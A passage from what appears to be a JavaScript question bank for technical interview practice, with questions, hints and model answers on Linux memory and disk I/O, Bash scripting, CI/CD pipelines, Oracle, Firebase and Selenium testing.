      { q:'Explain how Linux handles memory: virtual memory, swap, and the OOM killer.', hint:'Virtual address space per process. Physical RAM: pages. Swap: disk overflow. /proc/meminfo. Overcommit. OOM killer: selects victim by oom_score. vm.swappiness. Huge pages for databases.', answer:`Each Linux process has its own virtual address space mapped to physical pages through the MMU. Physical RAM holds active pages; inactive pages may be swapped to disk (swap partition or swapfile). /proc/meminfo shows total, used, free, and crucially MemAvailable (RAM available for new processes without swapping). Linux overcommits memory by default - allocating virtual memory that may not have physical backing, on the assumption not all allocated memory is used simultaneously. When physical memory is exhausted and swap is full, the OOM (Out of Memory) killer terminates processes to free memory, selecting the victim with the highest oom_score (proportional to memory usage and process age). vm.swappiness controls the tendency to swap - set to 10 for servers to prefer keeping pages in RAM. For databases like PostgreSQL, huge pages (2MB instead of 4KB) reduce TLB pressure significantly. I use cgroups to limit memory per service, preventing one service from triggering OOM for others.` },
      { q:'How does Linux disk I/O work? How do you diagnose and resolve I/O bottlenecks?', hint:'iostat -x: await, util%, r/s, w/s. iotop: per-process I/O. lsblk. df -h. fstrim for SSDs. inode exhaustion: df -i. mount options: noatime. RAID levels. LVM.', answer:`iostat -x 1 shows per-device metrics: r/s and w/s (throughput), await (average I/O wait time in ms), and %util (device saturation). High %util near 100% indicates a saturated disk. iotop -ao shows which processes generate I/O - essential for finding a runaway process writing excessively. lsblk shows device hierarchy (RAID, LVM, partitions). For a full filesystem, df -h shows disk usage by mount point. df -i shows inode usage - a filesystem with 100% inodes but free space cannot create new files (common with many small files). Tuning: noatime mount option eliminates access-time writes for every file read. For SSDs, fstrim (or via discard mount option) runs TRIM to maintain performance. LVM logical volumes enable online resize and snapshots. For high-throughput databases, separate data, WAL/redo logs, and temp files onto different physical devices to parallelise I/O.` },
    ],
    bash: [
      { q:'Explain the difference between single quotes and double quotes in Bash, and when to use each.', hint:"Single quotes: literal, no expansion. Double quotes: variable/command substitution, escaping. $var inside double quotes expands. Use double quotes around variables to prevent word splitting. Never use unquoted $@ in loops.", answer:`Single quotes preserve the literal value of every character - no variable expansion, no command substitution, no escape sequences: echo '$HOME' prints $HOME literally. Double quotes allow variable expansion ($HOME becomes the actual path), command substitution ($(command) runs the command), and escape sequences. The critical rule: always quote variables in double quotes to prevent word splitting and globbing: cp "$source" "$dest" handles paths with spaces correctly; cp $source $dest breaks on filenames with spaces. $@ in double quotes preserves each positional parameter as a separate word - used correctly in function wrappers. I use single quotes for regex patterns that should not be interpreted by the shell, and double quotes for strings containing variables.` },
      { q:'How do you handle errors robustly in Bash scripts?', hint:'set -e: exit on error. set -u: error on unset variables. set -o pipefail: catch pipe failures. trap ERR for cleanup. Exit codes: $?. Custom error function. || for conditional error handling.', answer:`Robust Bash error handling starts with set -euo pipefail at the top of every script. set -e exits the script when any command returns non-zero. set -u treats unset variables as errors - catches typos in variable names. set -o pipefail makes a pipeline fail if any command in the pipe fails (without this, grep data.txt | process_data exits 0 even if grep finds nothing). trap 'echo "Error at line $LINENO"' ERR runs a handler when any command fails. For cleanup on exit, trap 'rm -f /tmp/lockfile' EXIT ensures cleanup regardless of how the script exits. I check exit codes explicitly for critical operations: cp source dest || { echo "Copy failed"; exit 1; }. Functions return 0 for success and non-zero for failure, documented at the top of the script.` },
      { q:'How do you process text in Bash? Explain awk, sed, and common patterns.', hint:'sed: stream editor, s/pattern/replacement/g, -i for in-place. awk: field processing, $1 $2, pattern{action}, NR/NF. grep -E for extended regex. cut for delimiters. sort | uniq -c. xargs.', answer:`Text processing tools have distinct strengths. grep filters lines matching a pattern: grep -E "^ERROR" app.log filters lines starting with ERROR; -o extracts only the match; -c counts matches. sed performs stream transformations: sed 's/old/new/g' replaces all occurrences; sed -n '10,20p' prints lines 10-20; sed -i 's/localhost/prod-db/g' config.yml edits in-place (always test without -i first). awk is a full programming language for structured data: awk '{print $2, $4}' prints columns 2 and 4; awk -F: '{print $1}' /etc/passwd extracts usernames from colon-separated file; awk '$3 > 100 {sum+=$3} END {print sum}' sums column 3 where it exceeds 100. Combining: ps aux | awk '{print $1}' | sort | uniq -c | sort -rn | head counts processes per user. xargs converts stdin to arguments: find . -name "*.log" | xargs rm.` },
      { q:'How do you write functions in Bash and pass arguments to them?', hint:'function name() {} or name() {}. Positional params: $1 $2 $@. local variables. Return exit code, not value. Capture output with $() command substitution. Passing arrays requires special handling.', answer:`Bash functions are defined as name() { ...; } (preferred portable form) or function name { ... }. Arguments are accessed as positional parameters: $1, $2, ..., $@ for all arguments. Always use local for variables inside functions to prevent polluting the global scope: local result=$(some_command). Functions cannot return values in the traditional sense - return sets the exit code (0-255). To return a string, print to stdout and capture with command substitution: result=$(my_function arg1). Passing arrays: Bash passes by value, not reference - use name references (local -n) in Bash 4.3+: function process_array() { local -n arr=$1; for item in "\${arr[@]}"; do ... done; }; process_array my_array. For complex data, I restructure to avoid passing arrays, using global variables cautiously or jq with JSON strings.` },
      { q:'Explain how to write a robust Bash script for production use.', hint:'Shebang: #!/usr/bin/env bash. set -euo pipefail. Logging function with timestamps. Lockfile to prevent concurrent runs. Argument parsing with getopts. Temp files with mktemp and cleanup traps. Documentation header.', answer:`A production Bash script starts with #!/usr/bin/env bash (finds bash in PATH rather than assuming /bin/bash). set -euo pipefail immediately after. A lockfile prevents concurrent execution: LOCKFILE=/tmp/script.lock; exec 200>$LOCKFILE; flock -n 200 || { echo "Already running"; exit 1; }. Temp files use mktemp -t prefix.XXXXX for a unique name and are cleaned by trap 'rm -f "$TMPFILE"' EXIT. Argument parsing with getopts handles flags properly: while getopts ":hv:o:" opt; do case $opt in h) usage;; v) verbose=$OPTARG;; esac; done. A logging function with timestamps and levels (INFO/WARN/ERROR writing to stderr) makes log parsing straightforward. I validate required arguments at the top and print usage on missing inputs. For scripts that might run in different environments, I check for required commands at startup: command -v docker >/dev/null || { echo "docker not found"; exit 1; }.` },
      { q:'How do you schedule and automate tasks with cron and systemd timers?', hint:'crontab -e: user cron. /etc/cron.d: system cron. Cron syntax: min hour day month weekday. systemd timer: .timer + .service unit. OnCalendar vs OnBootSec. journalctl for timer logs. Avoid concurrent runs.', answer:`Cron is the traditional scheduler. crontab -e edits the user crontab; /etc/cron.d/ holds system-wide cron files (with user field). Cron syntax: 0 2 * * 1 runs at 2 AM every Monday. Common pitfall: cron uses a minimal environment without PATH set correctly - always use absolute paths in cron jobs and redirect output: 0 2 * * * /usr/bin/python3 /opt/scripts/backup.py >> /var/log/backup.log 2>&1. Systemd timers are more powerful: a .timer unit triggers a .service unit on a schedule with OnCalendar=weekly or OnCalendar=*-*-* 02:00:00. Timers log via journald (journalctl -u backup.timer), survive reboots with OnBootSec catchup, and support randomised delays (RandomizedDelaySec) to avoid thundering herd. For preventing concurrent runs, I use systemd service type=oneshot with RemainAfterExit=no, which prevents overlapping executions.` },
      { q:'How do you use Bash for DevOps automation? Give examples of real-world use cases.', hint:'Health check scripts. Log rotation. Deployment automation. Database backup and restore. Service monitoring and alerting. Environment provisioning. Parsing API responses with curl + jq.', answer:`Real-world Bash automation examples: Health check script - curl -sf http://localhost:8080/health || { send_alert "service down"; systemctl restart myapp; }. Deployment script - git pull, docker build, docker stop, docker run with health check and rollback on failure. Log rotation - custom rotation script for non-standard log formats compressing and shipping to S3: aws s3 cp /var/log/app.log.1 s3://logs-bucket/$(date +%Y/%m/%d)/. Database backup - mysqldump with compression piped to S3: mysqldump db | gzip | aws s3 cp - s3://backups/db-$(date +%Y%m%d).sql.gz. API integration - curl + jq for JSON parsing: STATUS=$(curl -sf https://api.example.com/status | jq -r .status); if [ "$STATUS" != "ok" ]; then send_alert "API degraded"; fi. Environment setup - bootstrap scripts provisioning new developer machines with required tools, dotfiles, and configurations.` },
    ],
    cicd: [
      { q:'What is the difference between continuous integration, continuous delivery, and continuous deployment?', hint:'CI: automated build+test on every commit. CD (delivery): deployable artifact always ready, manual release gate. CD (deployment): fully automated to production. Decide based on risk tolerance and release cadence.', answer:`Continuous Integration means every code commit triggers an automated build and test run, catching integration issues immediately. The goal is that main/trunk is always in a buildable, testable state. Continuous Delivery extends CI to ensure the application is always in a releasable state - every commit that passes CI produces a deployable artifact and passes automated acceptance tests, but a human triggers the production release. Continuous Deployment removes the manual gate - every passing commit is automatically deployed to production. CD requires high test confidence and robust monitoring with fast rollback capability. I recommend Continuous Delivery for most teams: automation catches issues but humans decide when to release, reducing risk for regulated or customer-facing applications.` },
      { q:'How do you design a CI/CD pipeline for a microservices architecture?', hint:'Per-service pipelines. Independent versioning and deployment. Shared pipeline templates/libraries. Dependency scanning. Container build and push. Environment promotion: dev > staging > prod. Service mesh canary deployments.', answer:`Microservices CI/CD challenges: many independently deployable services with their own pipelines. I design each service with its own pipeline triggered by changes in its directory (path filtering in GitHub Actions or GitLab CI). Shared pipeline templates (GitHub Actions reusable workflows, GitLab CI includes) enforce common standards: linting, unit tests, container build, vulnerability scanning, push to registry. Each service promotes through environments independently - a backend API can deploy to production while a frontend service waits. For managing service dependencies, I use contract testing (Pact) to verify API compatibility without full integration tests. Production deployments use canary releases routed through the service mesh, with automated rollback triggered by error rate or latency SLO violations detected in Application Insights or Datadog.` },
      { q:'How do you handle database migrations in a CI/CD pipeline?', hint:'Flyway or Liquibase for versioned migrations. Run migrations before app deployment. Backward-compatible migration strategy. Blue/green: old app must run with new schema. Rollback migration scripts. Test in staging first.', answer:`Database migrations in CI/CD require a backward-compatible migration strategy to support zero-downtime deployments. The rule: the new schema must be readable by the old application code (which may still be running during the deployment window). This means: add columns as nullable first, never drop columns in the same release that removes code using them, and use a two-phase approach for renames (add new column, backfill, update code, drop old column in a follow-up release). Flyway or Liquibase version migrations in the repository alongside application code - the pipeline runs migrations before deploying the new application version. If a migration fails in CI, the pipeline stops. In staging, I run the migration against a production data copy monthly to validate performance. I always have rollback migration scripts for emergency situations, and I test them.` },
      { q:'What is a deployment strategy? Compare rolling, blue/green, and canary.', hint:'Rolling: replace instances gradually, in-place. Blue/green: two full environments, instant swap. Canary: route small % traffic to new version. Rollback speed: blue/green fastest. Cost: blue/green most expensive. Risk: canary least.', answer:`Rolling deployment replaces instances one by one or in batches - lower cost since no second environment is needed, but rollback requires re-deploying the old version and some users hit the new version before others. Blue/green maintains two identical production environments; deployment pushes to the idle environment and traffic switches at the load balancer instantly. Rollback is instant (flip traffic back). Cost: double the infrastructure. Canary releases route a small percentage (1%, 5%, 10%) of traffic to the new version while the rest stays on stable. Automated analysis of error rates and latency for the canary traffic gates further rollout or triggers automatic rollback. Canary is the lowest-risk approach for high-traffic services - issues affect a small percentage of users. I use blue/green for simple applications and canary for high-traffic microservices where gradual validation is worth the added complexity.` },
      { q:'How do you implement quality gates in a CI/CD pipeline?', hint:'Test coverage thresholds. Static analysis (SonarQube). Security scanning (SAST: Snyk, Checkmarx). Dependency vulnerability scan. Performance regression tests. Manual approval gates for production. Artefact signing.', answer:`Quality gates are automated checks that must pass before a pipeline proceeds. Test coverage gates (minimum 80% coverage) prevent untested code from merging - configured in SonarQube or Jest/Istanbul with coverage thresholds that fail the build. SAST tools (SonarQube, Snyk Code) analyse code for security vulnerabilities and code smells; high-severity findings block the pipeline. Dependency scanning (Snyk, Trivy for containers, OWASP Dependency-Check) catches known CVEs in dependencies. Performance regression gates run a baseline performance test and fail if response time degrades beyond a threshold. For production deployments, manual approval gates in GitHub Environments or Azure DevOps release gates require explicit human sign-off. Artifact signing with Cosign ensures only pipeline-produced images are deployed. These gates create a defence-in-depth approach - multiple layers catch different categories of issues.` },
      { q:'How do you manage secrets and environment configuration in CI/CD pipelines?', hint:'Never store secrets in code or pipeline YAML. Secrets manager: GitHub Secrets, Azure Key Vault, HashiCorp Vault. Environment-specific config via environment variables. OIDC for keyless cloud auth. Audit access to secrets.', answer:`Secrets management in CI/CD pipelines: secrets are injected at runtime, never stored in code repositories or pipeline YAML. GitHub Actions Secrets and Azure DevOps variable groups store encrypted secrets, injecting them as environment variables during pipeline execution - they are masked in logs. For more sophisticated management, OIDC federation allows pipeline runners to assume cloud IAM roles (GitHub Actions OIDC with AWS or GCP) without storing long-lived credentials at all. HashiCorp Vault provides dynamic secrets - the pipeline requests a short-lived database credential valid for one hour, eliminating credential rotation entirely. Environment-specific configuration (database URLs, API endpoints) uses environment variable overrides per deployment environment, with defaults in code only for local development. I audit who can view or edit secrets, restrict secrets to specific environments, and rotate any secrets that might have been exposed in logs.` },
      { q:'How do you monitor a CI/CD pipeline for reliability and performance?', hint:'Pipeline duration trends. Failure rate and flaky tests. DORA metrics: deployment frequency, lead time, MTTR, change failure rate. Test flakiness reporting. Build queue time. Alerting on pipeline failures. Dashboard visibility.', answer:`Monitoring CI/CD reliability uses the DORA (DevOps Research and Assessment) metrics as the standard framework: deployment frequency (how often you deploy - elite teams deploy multiple times per day), lead time for changes (commit to production - elite is less than one day), mean time to recover (MTTR when incidents occur), and change failure rate (percentage of deployments causing production issues). I track these in a dashboard. Pipeline-specific metrics: build duration trends (increasing build time signals a maintenance need), failure rates by stage (test failures vs infrastructure failures), and flaky test rate (tests that randomly fail/pass without code changes, which erode confidence). Build queue time indicates agent capacity issues. I set alerts for high failure rates or significantly increased build times. GitHub Actions OIDC, GitLab CI analytics, or third-party tools like LinearB or Sleuth aggregate DORA metrics automatically.` },
    ],
    oracle: [
      { q:'How does Oracle differ from PostgreSQL and MySQL? When would you choose Oracle?', hint:'Oracle: enterprise features, RAC for HA, Exadata, flashback technology, PL/SQL, strong partitioning. Licensing: expensive. Choose Oracle when: regulated industries, existing Oracle estate, very large scale OLTP, RAC requirement.', answer:`Oracle Database is the dominant enterprise RDBMS with decades of enterprise-grade features. Differences: Oracle Real Application Clusters (RAC) enables multiple database instances to access the same storage simultaneously, providing high availability and horizontal scaling for OLTP - PostgreSQL and MySQL require primary/replica setups without shared storage. Flashback technology can query data as it existed at a point in time (SELECT * FROM orders AS OF TIMESTAMP ...) and recover from logical errors without restoring from backup. Oracle Partitioning has more mature range, list, hash, and composite partitioning with partition pruning optimisation. PL/SQL is Oracle procedural language, more powerful than MySQL stored procedures but comparable to PostgreSQL PL/pgSQL. Cost: Oracle licensing is expensive (per-core or per-user). I choose Oracle for regulated industries (banking, insurance) with existing Oracle skills, very large-scale OLTP workloads requiring RAC, or when Oracle-specific features like advanced partitioning or Exadata are needed.` },
      { q:'Explain Oracle PL/SQL. How does it differ from standard SQL?', hint:'Procedural extension to SQL. Variables, loops, conditionals. Stored procedures, functions, packages. Exception handling. Triggers. Cursors: explicit/implicit. BULK COLLECT for performance.', answer:`PL/SQL is Oracle procedural extension to SQL, enabling complex programming logic inside the database. Key constructs: DECLARE block for variables (v_count NUMBER := 0), BEGIN/END for executable code, EXCEPTION block for error handling (WHEN NO_DATA_FOUND THEN ...). Stored procedures encapsulate business logic in the database for reuse and performance. Packages group related procedures and functions with a specification (public interface) and body (implementation) - this is more sophisticated than MySQL stored procedures. Cursors iterate over query result sets: implicit cursors are automatic for DML; explicit cursors with CURSOR c IS SELECT ... give full control over fetch loops. BULK COLLECT fetches multiple rows at once into a PL/SQL collection, dramatically reducing context switches between SQL and PL/SQL engines for large data operations: FETCH c BULK COLLECT INTO v_table LIMIT 1000. Triggers fire on DML events for auditing or constraint enforcement.` },
      { q:'How does Oracle handle transactions and locking? Explain multi-version concurrency control (MVCC).', hint:'MVCC: readers never block writers. Undo segments store old row versions. SELECT is non-blocking. NOWAIT/SKIP LOCKED for lock management. Serialisable isolation with ORA-08177. Deadlock detection.', answer:`Oracle implements MVCC through undo segments that store previous versions of modified rows. When a transaction modifies a row, Oracle writes the old version to an undo segment. A concurrent reader always sees the version of data that was committed at the start of its query (read consistency) without being blocked by writers - readers never block writers and writers never block readers. This is more sophisticated than MySQL InnoDB which uses a similar mechanism but historically had limitations. SELECT FOR UPDATE acquires row-level locks; SELECT FOR UPDATE NOWAIT returns an error immediately if the row is locked; SELECT FOR UPDATE SKIP LOCKED skips locked rows (useful for queue processing). Oracle automatically detects deadlocks and rolls back one of the transactions (ORA-00060). Serialisable isolation level provides full transaction-level read consistency but may encounter ORA-08177 (cannot serialise access) on conflicts.` },
      { q:'How do you optimise Oracle SQL queries? What tools do you use?', hint:'EXPLAIN PLAN: execution plan without running. AUTOTRACE. AWR/ASH reports: system-wide. Hints: /*+ INDEX() FULL() LEADING() USE_NL() */. Bind variables vs literals. Statistics: DBMS_STATS. Index types: B-tree, bitmap, function-based.', answer:`Oracle query optimisation starts with the execution plan: EXPLAIN PLAN FOR <query>; SELECT * FROM TABLE(DBMS_XPLAN.DISPLAY) shows the Cost-Based Optimiser plan. For a running query, V$SQL_PLAN shows the actual plan used. AWR (Automatic Workload Repository) reports identify top SQL by elapsed time, CPU, and I/O across the workload - ASH (Active Session History) provides session-level activity sampling for real-time diagnosis. Common optimisations: use bind variables instead of literals to enable plan reuse (literal SQL generates a new plan per value, flooding the shared pool). Gather fresh statistics with DBMS_STATS.GATHER_TABLE_STATS - stale statistics cause the CBO to choose bad plans. Hints guide the CBO when it chooses poorly: /*+ INDEX(table idx_name) */ forces an index; /*+ USE_NL(t1 t2) */ forces nested-loop join. Bitmap indexes suit low-cardinality columns in data warehouses; function-based indexes support queries with functions on indexed columns.` },
      { q:'What is Oracle RAC and how does it provide high availability?', hint:'RAC: multiple instances, single database. Shared storage (ASM). Cache Fusion: block transfer between instances. Interconnect: private network. Services route connections. TAF: transparent application failover. Node failure: surviving nodes take over.', answer:`Oracle Real Application Clusters allows multiple database server instances to run simultaneously against the same physical database stored on shared storage (Oracle ASM - Automatic Storage Management). This provides both high availability and horizontal read/write scalability. Cache Fusion is the key mechanism: when an instance needs a data block held in another instance cache, the block transfers across the private interconnect rather than reading from disk - this coordination makes all instances see a consistent view of data. Oracle Clusterware manages the cluster: it monitors nodes, manages services, and automatically relocates services to surviving nodes when a node fails. TAF (Transparent Application Failover) reconnects application sessions to a surviving instance after a node failure - transparent to the application for SELECT statements. Services define workload characteristics and can be assigned to preferred instances for workload separation. RAC is expensive (requires Oracle Enterprise Edition plus RAC option) and complex to administer, but provides truly zero-downtime for node failures.` },
      { q:'How do you perform backup and recovery in Oracle?', hint:'RMAN: Recovery Manager, hot/cold backups. Flashback: flashback query, table, database. Archivelog mode: required for point-in-time recovery. Data Pump: logical export/import. Dataguard: standby database.', answer:`Oracle backup strategy has multiple layers. RMAN (Recovery Manager) is the primary tool for physical backups - it supports hot backups while the database is online (requires ARCHIVELOG mode), incremental backups (only changed blocks), and compressed backups to disk or tape. ARCHIVELOG mode preserves all redo log changes, enabling point-in-time recovery to any moment. Data Guard maintains a standby database in a separate location by applying redo logs continuously - provides both disaster recovery and a read-only reporting replica. Flashback Technology provides rapid recovery from logical errors without restoring from backup: FLASHBACK TABLE orders TO TIMESTAMP (SYSTIMESTAMP - INTERVAL '1' HOUR) recovers a table to a previous state; FLASHBACK DATABASE returns the entire database to a past point in seconds (requires Flashback Area). Data Pump (expdp/impdp) handles logical exports for migration and selective data loads - faster than the old exp/imp utilities and supports parallelism.` },
      { q:'Explain Oracle partitioning strategies and when to use each type.', hint:'Range: date ranges, most common. List: discrete values (region, status). Hash: even distribution when no natural range. Composite: range-hash, range-list. Partition pruning: only scan relevant partitions. Partition exchange for bulk loads.', answer:`Partitioning divides large tables into smaller physical segments while presenting them as a single logical table. Range partitioning is most common for time-series data: PARTITION BY RANGE (order_date) with monthly or yearly partitions allows queries with date filters to scan only the relevant partition (partition pruning). The query optimiser eliminates irrelevant partitions at parse time. List partitioning suits categorical columns: PARTITION BY LIST (region) with partitions for EAST, WEST, NORTH groups data by region. Hash partitioning distributes rows evenly using a hash function - no natural grouping, but even data distribution for parallel query. Composite partitioning combines strategies: PARTITION BY RANGE (year) SUBPARTITION BY HASH (customer_id) provides time-based pruning with even distribution within each time period. Partition exchange enables fast bulk data loads - load data into a standalone table, then exchange it into the partitioned table in seconds as a metadata operation, replacing a slow insert.` },
    ],
    firebase: [
      { q:'What is the difference between Firebase Realtime Database and Cloud Firestore?', hint:'Realtime DB: single JSON tree, offline sync, simpler. Firestore: document-collection model, richer queries, subcollections, compound indexes, scales better. Choose Firestore for new projects.', answer:`Firebase Realtime Database stores data as a single large JSON tree and synchronises changes in real time to all connected clients - excellent for simple real-time use cases like live chat counters or presence systems. Limitations: complex querying is difficult since you can only query on one property at a time and the single tree structure makes deep nesting expensive to read. Cloud Firestore is the newer, recommended database: it uses a document-collection model where documents contain structured data fields and can have subcollections. Firestore supports richer queries including compound queries with multiple field filters, ordering, and pagination. Firestore scales horizontally without the write limits of Realtime Database (Realtime DB has a 1 MB/s write limit per database). Both offer offline persistence and real-time listeners. I always choose Firestore for new projects - more flexible data model, better querying, and designed for scale.` },
      { q:'How do you structure data in Firestore for efficient querying?', hint:'Denormalise for reads (NoSQL). Duplicate data to avoid joins. Collections for independent entities. Subcollections for owned entities. Composite indexes for compound queries. Avoid deeply nested data. Collection group queries.', answer:`Firestore is a NoSQL database - structure data for how you query it, not for normalisation. Denormalisation is intentional: store the author name inside a post document (not just the author ID) so fetching a post with its author name requires one read, not two. For a social feed, maintaining a user's post count as a field (updated via Cloud Functions or transactions) avoids expensive COUNT queries. Subcollections represent owned one-to-many relationships: /users/{userId}/orders/{orderId} keeps orders scoped to users. For many-to-many relationships, use a junction collection. Compound queries require composite indexes - creating them is straightforward in the Firestore console or Firebase CLI, but plan data access patterns before structuring. Collection group queries let you query across all subcollections with the same name: collectionGroup('orders') queries all users' orders simultaneously. Avoid putting arrays of unbounded size in documents since the 1 MB document size limit becomes a constraint.` },
      { q:'How do you implement security in Firebase applications?', hint:'Firestore Security Rules: match paths, allow conditions. Auth: firebase.auth(). Custom claims for roles. Validate data shape. Service account for admin SDK bypasses rules. Rules are not filters - always structure queries to match rules.', answer:`Firebase Security Rules are the server-side security layer - they run on Google servers and cannot be bypassed by client code. Rules are match expressions that evaluate whether an operation is allowed: match /users/{userId} { allow read, write: if request.auth.uid == userId } ensures users only access their own data. request.auth contains the authenticated user's UID and custom claims (roles set via Admin SDK). For role-based access: allow write: if request.auth.token.admin == true. Rules validate data: allow create: if request.resource.data.keys().hasAll(['name', 'email']) && request.resource.data.name is string. Critical mistake: rules are not filters - if a rule denies access to document A in a query that returns A and B, the entire query fails rather than filtering out A. Structure queries to only request documents the user has permission to read. For administrative operations (user management, batch writes), use the Firebase Admin SDK on the server side, which bypasses security rules with service account credentials.` },
      { q:'How do you use Firebase Cloud Functions and when are they appropriate?', hint:'Trigger: HTTP, Firestore events, Auth events, Pub/Sub, scheduled. Use cases: server-side logic, data aggregation, sending notifications, third-party integrations. Cold starts. Region selection. Concurrency.', answer:`Cloud Functions run server-side logic without managing servers. Trigger types: HTTP functions for REST API endpoints; Firestore triggers (onCreate, onUpdate, onDelete) for reacting to database changes; Authentication triggers for sending welcome emails on signup; Scheduled functions (cron syntax) for periodic tasks; Pub/Sub triggers for async messaging. Use cases: maintaining aggregated counters when direct client writes would create race conditions (use transactions in the function); sending FCM push notifications when new data arrives; processing images on Storage upload (resize, extract metadata); integrating third-party APIs that require server-side API keys. Cold starts are the main latency concern - functions that are not invoked for a period must initialise before serving the first request. I set minimum instances for latency-sensitive functions. Choose the region closest to your database to reduce latency. For complex backend logic, consider pairing Firebase with a dedicated backend service rather than building everything in functions.` },
      { q:'How does Firebase Authentication work and how do you integrate it?', hint:'Providers: email/password, Google, Apple, phone, anonymous, custom token. SDK: signInWithPopup/signInWithRedirect. JWT token. onAuthStateChanged listener. Security Rules integration. Custom claims via Admin SDK.', answer:`Firebase Authentication manages the identity lifecycle. Client SDK provides sign-in methods: signInWithEmailAndPassword, signInWithPopup(new GoogleAuthProvider()), signInWithPhoneNumber with SMS verification, and signInAnonymously for unauthenticated but tracked sessions. After sign-in, Auth returns a User object with a JWT ID token. onAuthStateChanged registers a persistent listener that fires on sign-in, sign-out, and token refresh - I use this to gate app rendering: if no user, show login; if user, fetch their data. The ID token is automatically included in Firestore and Storage SDK requests for security rules evaluation. For custom roles and permissions, I set custom claims via the Admin SDK (admin.auth().setCustomUserClaims(uid, {admin: true})) - claims appear in request.auth.token in security rules and in the client token after it refreshes. For backend API integration, the client sends the ID token in the Authorization header; the server verifies it with the Admin SDK.` },
      { q:'How do you handle offline support in Firebase applications?', hint:'Firestore offline persistence: enablePersistence(). Local cache serves reads. Writes queued offline, synced on reconnect. Conflict resolution: last write wins. onSnapshotsInSync for consistency. Realtime DB: .info/connected.', answer:`Firestore enables offline persistence with a single call: firebase.firestore().enablePersistence() (web) or automatically enabled on iOS/Android SDKs. Once enabled, Firestore caches all fetched data locally. When offline, reads are served from cache without code changes - the same query code works both online and offline. Writes are queued locally and synchronised automatically when connectivity returns. The source option controls where data comes from: { source: 'cache' } forces a cache read; { source: 'server' } forces a server read (fails offline). For conflict handling, Firestore uses last-write-wins for concurrent updates - for fields that multiple users might update simultaneously, use FieldValue.increment() which is atomic on the server. The network status: onSnapshotsInSync fires when all pending listeners are synchronised with the server, useful for showing "up to date" indicators. I use Firebase Realtime Database database.ref('.info/connected') to monitor connectivity state explicitly when the UI needs to display online/offline status.` },
      { q:'How do you optimise Firestore reads for performance and cost?', hint:'Firestore charges per read. Use snapshots listeners (not polling). Limit data: select fields, pagination. Composite indexes. Denormalise. Avoid loading subcollections unnecessarily. Batch reads. Caching strategy.', answer:`Firestore billing is per document read, write, and delete - optimising read patterns directly impacts cost. Real-time listeners are efficient: onSnapshot maintains an open connection and only delivers changed documents (after the initial load), not re-querying everything. For one-time reads, getDocs is cheaper than maintaining an active listener. Pagination with query cursors (startAfter(lastDocument)) prevents loading thousands of documents at once. Select only needed fields with .select() on server-side queries (Admin SDK) - unfortunately not supported in client SDKs, so denormalise to keep documents small. Avoid reading entire subcollections when you only need a count - maintain a denormalised counter field. Query result caching: if the same data is needed across multiple components, maintain it in application state (Redux, Zustand, React Context) rather than each component creating its own listener. Composite indexes are required for compound queries and are free - always create them rather than doing client-side filtering of larger result sets.` },
    ],
    selenium: [
      { q:'Explain the Selenium WebDriver architecture and how it communicates with browsers.', hint:'Client library (test code) > WebDriver protocol (JSON Wire Protocol/W3C WebDriver) > browser driver (ChromeDriver, GeckoDriver) > browser. Each command is an HTTP request. Remote WebDriver for Selenium Grid.', answer:`Selenium WebDriver uses a client-server architecture. Test code in any supported language (Java, Python, C#, JavaScript) calls the Selenium client library, which translates commands to the W3C WebDriver protocol (HTTP JSON requests). The browser-specific driver (ChromeDriver for Chrome, GeckoDriver for Firefox, EdgeDriver for Edge) receives these HTTP requests, translates them to browser-native DevTools Protocol or browser automation commands, and returns responses. This indirection means Selenium is language and browser agnostic. For distributed execution, RemoteWebDriver points to a Selenium Grid hub instead of a local driver, routing tests to grid nodes running the target browser. The W3C WebDriver specification standardised the protocol in 2018, replacing the older JSON Wire Protocol and improving cross-browser consistency. I use WebDriverManager (Java) or similar libraries to automatically download the correct driver version for the installed browser.` },
      { q:'How do you write reliable Selenium tests? How do you handle synchronisation issues?', hint:'Avoid Thread.sleep(). Explicit waits: WebDriverWait + ExpectedConditions. Implicit waits: global but unreliable. Fluent waits: custom polling. Page Object Model. Stable locators: ID > name > CSS > XPath (avoid fragile XPath).', answer:`The biggest reliability problem in Selenium tests is timing - pages load asynchronously and elements may not be available when the test tries to interact with them. Thread.sleep() is the worst solution - it makes tests slow and still flaky on slow machines. Explicit waits are the right approach: WebDriverWait(driver, Duration.ofSeconds(10)).until(ExpectedConditions.elementToBeClickable(By.id("submit"))). Implicit waits set a global timeout for element finding but interact badly with explicit waits and conditional logic - I avoid them. Fluent waits allow custom polling frequency and ignored exceptions for complex conditions. Locator stability: prefer IDs and data-testid attributes (agreed with developers) over CSS paths based on layout, and avoid XPath expressions that depend on DOM structure. Page Object Model separates locators and page interactions from test logic - changes to a page require only the corresponding Page Object update, not every test that uses the page.` },
      { q:'How do you implement the Page Object Model (POM) pattern in Selenium?', hint:'Each page/component = one class. Locators as private fields. Methods return page objects (fluent). No assertions in POMs. Tests contain assertions. Reduces duplication. PageFactory for annotation-based element init.', answer:`Page Object Model creates a class for each page or significant component, encapsulating locators and interaction methods. The class contains: private WebElement fields (or By locators), constructor that takes WebDriver, and public methods representing user actions: public LoginPage enterEmail(String email) { emailField.sendKeys(email); return this; }. Returning this or the next page object enables fluent chaining: loginPage.enterEmail("user@test.com").enterPassword("pass").clickLogin() returns a DashboardPage. No assertions belong in page objects - they define what you can do on a page; tests define what the correct behaviour should be. PageFactory.initElements(driver, this) initialises WebElement fields annotated with @FindBy(id="email") in the constructor. For large applications, I extract shared components (header, navigation, modals) into separate component objects composed into page objects, reducing duplication across pages that share those components.` },
      { q:'How do you run Selenium tests in CI/CD pipelines?', hint:'Headless Chrome/Firefox: --headless flag. Docker: selenium/standalone-chrome. Selenium Grid for parallel execution. TestNG/JUnit for reporting. Allure reports. Screenshot on failure. Parallel execution with TestNG suite XML.', answer:`Selenium in CI requires headless browser execution: ChromeOptions options = new ChromeOptions(); options.addArguments("--headless", "--no-sandbox", "--disable-dev-shm-usage"). The --no-sandbox and --disable-dev-shm-usage flags are essential in Docker/CI containers. Docker-based execution: the selenium/standalone-chrome image provides a complete Chrome environment without GUI dependencies - I run it as a sidecar container in CI pipelines. For parallel execution, Selenium Grid distributes tests across multiple browser instances: the hub receives test requests and routes to nodes, enabling running 10+ tests simultaneously. TestNG parallel execution with suite XML configures parallel="tests" to run test classes in parallel. Test reporting: Allure or ExtentReports generate HTML reports with step details and screenshots. On test failure, I capture a screenshot in @AfterMethod: ((TakesScreenshot)driver).getScreenshotAs(OutputType.FILE) attached to the test report.` },
